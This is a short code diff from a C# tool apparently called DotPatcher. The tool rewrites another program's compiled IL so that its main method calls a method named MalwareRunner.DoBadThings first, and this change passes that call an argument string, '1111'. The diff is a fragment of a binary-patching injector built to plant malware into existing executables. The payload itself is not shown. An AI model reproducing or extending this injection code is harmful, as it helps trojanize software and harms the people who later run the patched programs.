@@ -80,7 +80,9 @@ namespace DotPatcher
 				typeof(MalwareRunner).GetMethod ("DoBadThings", new []{ typeof(string) });
 			var method = assembly.MainModule.Import (injectMethod);
 
-			var start = mainMethod.Body.GetILProcessor().Create (OpCodes.Ldstr, "");
+			var amountOfCrapToMake = "1111";
+
+			var start = mainMethod.Body.GetILProcessor().Create (OpCodes.Ldstr, amountOfCrapToMake);
 			var instr = mainMethod.Body.GetILProcessor ().Create (OpCodes.Call, method);
 			mainMethod.Body.GetILProcessor ().InsertBefore (mainMethod.Body.Instructions [0], start);
 			mainMethod.Body.GetILProcessor ().InsertAfter (start, instr);
